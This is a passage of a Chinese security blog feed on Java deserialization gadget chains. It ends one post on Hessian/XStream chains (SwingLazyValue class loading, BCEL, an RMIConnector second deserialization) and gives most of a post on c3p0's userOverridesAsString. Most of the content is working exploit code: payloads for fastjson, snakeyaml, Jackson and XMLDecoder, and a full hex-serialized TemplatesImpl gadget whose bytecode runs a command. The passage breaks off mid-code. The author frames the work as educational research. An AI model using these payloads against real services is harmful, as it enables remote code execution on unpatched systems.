class="hljs-string">&quot;doLookup&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;</span>&#125;));<br></code></pre></td></tr></table></figure><p>还可以高版本打tomcat的el表达式</p><h4 id="三、类加载"><a href="#三、类加载" class="headerlink" title="三、类加载"></a>三、类加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        Class&lt;?&gt; JVM = Class.forName(<span class="hljs-string">&quot;sun.tracing.dtrace.JVM&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> JVM.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, ClassLoader.class, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; declaredConstructor = JVM.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">jvm</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance();<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; defineClass,jvm, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jvm.getClass().getClassLoader(),evil,bcode,<span class="hljs-number">0</span>,bcode.length&#125;&#125;&#125;;<br><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>, ags);<br><span class="hljs-comment">//第二次直接调用加载的方法</span><br><span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(evil, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>打两次，第一次加载，第二次调用<br></code></pre></td></tr></table></figure><p>还有一些becl什么都是同理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        ##加载becl，第一次加载字节码，第二次调用</span><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span>+ Utility.encode(javaClass.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">_main</span> <span class="hljs-operator">=</span> JavaWrapper.class.getMethod(<span class="hljs-string">&quot;_main&quot;</span>, String[].class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; _main,<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaWrapper</span>(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;payload&#125;&#125;&#125;&#125;;<br><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>,ags);<br><span class="hljs-comment">//        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;_main()&quot;,null,null);</span><br></code></pre></td></tr></table></figure><h4 id="四、打二次反序列"><a href="#四、打二次反序列" class="headerlink" title="四、打二次反序列"></a>四、打二次反序列</h4><p><img src="image-20240129020010080.png" alt="image-20240129020010080"></p><p>没过滤javax.management.remote.rmi</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;jdk的序列化bin&quot;</span>);<br><span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(file.toPath());<br><span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes);<br><br><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">connect</span> <span class="hljs-operator">=</span> rmiConnector.getClass().getMethod(<span class="hljs-string">&quot;connect&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; connect,rmiConnector, <span class="hljs-literal">null</span>&#125;&#125;;<br></code></pre></td></tr></table></figure><p>打RMIConnector的二次。需要注意二次使用jdk的序列化，不是hessian的。</p><p>以上未尝试复现，纯理论，实战可能需要改改。</p><p>总后致敬<strong>wh1t3p1g</strong>，都是XStream的链子。</p><h3 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h3><p><a href="https://yml-sec.top/2022/04/20/apachedubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">https://yml-sec.top/2022/04/20/apachedubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</a></p><p><a href="https://guokeya.github.io/post/psaIZKtC4/">https://guokeya.github.io/post/psaIZKtC4/</a></p><p><a href="https://su18.org/post/hessian/">https://su18.org/post/hessian/</a></p><p><a href="https://blog.0kami.cn/blog/2021/xstream_blacklist_bypass/">https://blog.0kami.cn/blog/2021/xstream_blacklist_bypass/</a></p><h3 id="补"><a href="#补" class="headerlink" title="补"></a>补</h3><p><a href="https://github.com/sofastack/sofa-rpc/security/advisories/GHSA-7q8p-9953-pxvr">https://github.com/sofastack/sofa-rpc/security/advisories/GHSA-7q8p-9953-pxvr</a></p><p><img src="image-20240201163644390.png" alt="image-20240201163644390"></p><p>官网写的小于5.11.1，启明写的小于5.12.0，那没事了。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p><p>​</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次反序列化学习(二)</title>
    <link href="/2024/01/19/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
    <url>/2024/01/19/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="二次反序列化学习（二）"><a href="#二次反序列化学习（二）" class="headerlink" title="二次反序列化学习（二）"></a>二次反序列化学习（二）</h1><p>网络安全在线讨口子</p><p><img src="image-20240119214240522.png" alt="image-20240119214240522"></p><h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><p>​c3p0是用于创建和管理连接，利用“池”的方式复用连接减少资源开销，和其他数据源一样，也具有连接数控制、连接可靠性测试、连接泄露控制、缓存语句等功能。</p><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;impl&#x2F;WrapperConnectionPoolDataSourceBase.java</p><p><img src="image-20240119221947295.png" alt="image-20240119221947295"></p><p><img src="image-20240119220920017.png" alt="image-20240119220920017"></p><p>这个类的javaBean有个userOverridesAsString。还是个抽象类。</p><p>主要判断传的值和userOverridesAsString属性值是否相等或者其中一个为null就会执行if代码块</p><p>java&#x2F;beans&#x2F;VetoableChangeSupport.java#fireVetoableChange()</p><p><img src="image-20240119222708517.png" alt="image-20240119222708517"></p><p><img src="image-20240119222719297.png" alt="image-20240119222719297"></p><p>进行赋值。</p><p><img src="image-20240119222428577.png" alt="image-20240119222428577"></p><p><img src="image-20240119222505926.png" alt="image-20240119222505926"></p><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.java#vetoableChange()</p><p><img src="image-20240119222956907.png" alt="image-20240119222956907"></p><p>然后获取里event的newvalue。</p><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;impl&#x2F;C3P0ImplUtils.java#parseUserOverridesAsString()</p><p><img src="image-20240119223053628.png" alt="image-20240119223053628"></p><p>然后就是获取到的newvalue进行截取。</p><p><img src="image-20240119223320091.png" alt="image-20240119223320091"></p><p><img src="image-20240119223433557.png" alt="image-20240119223433557"></p><p>注意这里的索引，所以HexAsciiSerializedMap和最后面要补一位字符。hex是2字节。</p><p>然后把截取的hex转byte数组。</p><p><img src="image-20240119223744487.png" alt="image-20240119223744487"></p><p>然后就是进行反序列化。</p><p>由于WrapperConnectionPoolDataSource这个类是抽象类，所以我们要找一个继承这个类，然后没有setUserOverridesAsString()这个方法。这样我们调用setUserOverridesAsString时就会去找抽象类的这个方法。</p><p><strong>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.java</strong></p><p>这个类符合这个条件</p><p><img src="image-20240119224142472.png" alt="image-20240119224142472"></p><h3 id="0x02-一些触发链"><a href="#0x02-一些触发链" class="headerlink" title="0x02 一些触发链"></a>0x02 一些触发链</h3><p>​我们知道fastjson、snayaml、json反序列化都是调用javaBean的set方法。所以就有一下exp</p><h4 id="一、fastjson"><a href="#一、fastjson" class="headerlink" title="一、fastjson &lt;&#x3D;1.2.47 反序列化"></a>一、fastjson &lt;&#x3D;1.2.47 反序列化</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> fileToHex(<span class="hljs-string">&quot;rome&quot;</span>);<br><span class="hljs-comment">//        一、fastjson触发，1.2.47一下。属实鸡肋～</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap2&quot;</span>+exp+<span class="hljs-string">&quot;2\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parseObject(json);<br></code></pre></td></tr></table></figure><p><img src="image-20240119225953014.png" alt="image-20240119225953014"></p><p>占位符，随便写个1字符都行</p><h4 id="二、snakeyaml-反序列化-（不用SafeConstructor构造）"><a href="#二、snakeyaml-反序列化-（不用SafeConstructor构造）" class="headerlink" title="二、snakeyaml 反序列化 （不用SafeConstructor构造）"></a>二、snakeyaml 反序列化 （不用SafeConstructor构造）</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//       二、利用snakeyaml触发，只要 snakeyaml构造器没有使用SafeConstructor就可以触发，相对fastjson，但是yaml反序列一般都在后台，只能说半斤八两。</span><br>        <span class="hljs-keyword">String</span> payload = <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +<br>                <span class="hljs-string">&quot;userOverridesAsString: HexAsciiSerializedMap@&quot;</span> + exp + <span class="hljs-string">&#x27;@&#x27;</span>;<br><br><span class="hljs-comment">//        SafeConstructor safeConstructor = new SafeConstructor();</span><br><span class="hljs-comment">//        Yaml yaml = new Yaml(safeConstructor);</span><br>        Yaml yaml = <span class="hljs-keyword">new</span> <span class="hljs-type">Yaml</span>();<br>        yaml.load(payload);<br></code></pre></td></tr></table></figure><h4 id="三、Jackson-2-8-10反序列化-更加鸡肋"><a href="#三、Jackson-2-8-10反序列化-更加鸡肋" class="headerlink" title="三、Jackson &lt; 2.8.10反序列化 更加鸡肋"></a>三、Jackson &lt; 2.8.10反序列化 更加鸡肋</h4><p>Jackson-databind 支持 <a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization">Polymorphic Deserialization</a> 特性（默认情况下不开启）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> Object object;<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ exp + <span class="hljs-string">&quot;;\&quot;&#125;]&#125;&quot;</span>;<br>        System.out.println(poc);<br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        objectMapper.enableDefaultTyping();<br>        objectMapper.readValue(poc, Person.class);<br>    &#125;<br><br></code></pre></td></tr></table></figure><h4 id="四、XML反序列-（说实话都xml反序列化了，随便干了）"><a href="#四、XML反序列-（说实话都xml反序列化了，随便干了）" class="headerlink" title="四、XML反序列 （说实话都xml反序列化了，随便干了）"></a>四、XML反序列 （说实话都xml反序列化了，随便干了）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;calc.xml&quot;</span>);<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br><span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bis);<br>xmlDecoder.readObject();<br>xmlDecoder.close();<br></code></pre></td></tr></table></figure><p>xmlpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;java&gt;<br>    &lt;object class=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;<br>        &lt;<span class="hljs-keyword">void</span> method=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;<br>                &lt;string&gt;HexAsciiSerializedMap:aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000003774000c636f6d2e7365722e526f6d65740009526f6d652e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0015787372002a636f6d2e73756e2e73796e6469636174696f6e2e666565642e696d706c2e546f537472696e674265616e09f58e4a0f23ee310200024c000a5f6265616e436c6173737400114c6a6176612f6c616e672f436c6173733b4c00045f6f626a71007e000178707672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c61746573000000000000000000000078707372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00054c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e0020000787000000192cafebabe000000340019010005726f6d6531070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700030100083c636c696e69743e010003282956010004436f64650100116a6176612f6c616e672f52756e74696d6507000801000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c000a000b0a0009000c0100126f70656e202d612063616c63756c61746f7208000e01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c001000110a000900120100063c696e69743e0c001400060a0004001501000a536f7572636546696c6501000a726f6d65312e6a6176610021000200040000000000020008000500060001000700000016000200000000000ab8000d120fb6001357b100000000000100140006000100070000001100010001000000052ab70016b10000000000010017000000020018707400046e616d657077010078;&lt;/string&gt;<br>        &lt;/<span class="hljs-keyword">void</span>&gt;<br>    &lt;/object&gt;<br>&lt;/java&gt;<br></code></pre></td></tr></table></figure><p>水平有限，列出四种触发，纯纯鸡肋。</p><h3 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> Object object;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">c3p0_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> fileToHex(<span class="hljs-string">&quot;rome&quot;</span>);<br><span class="hljs-comment">//        一、fastjson触发，1.2.47一下。属实鸡肋～</span><br><span class="hljs-comment">//        String json =&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;    \&quot;rand1\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;    &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;    \&quot;rand2\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap?&quot;+exp+&quot;?\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;    &#125;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;</span><br><span class="hljs-comment">//        JSON.parseObject(json);</span><br><br><span class="hljs-comment">//       二、利用snakeyaml触发，只要 snakeyaml构造器没有使用SafeConstructor就可以触发，相对fastjson，但是yaml反序列一般都在后台，只能说半斤八两。</span><br><span class="hljs-comment">//        String payload = &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot; +</span><br><span class="hljs-comment">//                &quot;userOverridesAsString: HexAsciiSerializedMap@&quot; + exp + &#x27;@&#x27;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">////        SafeConstructor safeConstructor = new SafeConstructor();</span><br><span class="hljs-comment">////        Yaml yaml = new Yaml(safeConstructor);</span><br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(payload);</span><br><br><span class="hljs-comment">//        三、Jackson &lt; 2.8.10反序列化</span><br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ exp + &quot;;\&quot;&#125;]&#125;&quot;;</span><br><span class="hljs-comment">//        System.out.println(poc);</span><br><span class="hljs-comment">//        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="hljs-comment">//        objectMapper.enableDefaultTyping();</span><br><span class="hljs-comment">//        objectMapper.readValue(poc, Person.class);</span><br><span class="hljs-comment">//        四、XML反序列化 天大的鸡肋，纯凑数</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;calc.xml&quot;</span>);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bis);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span 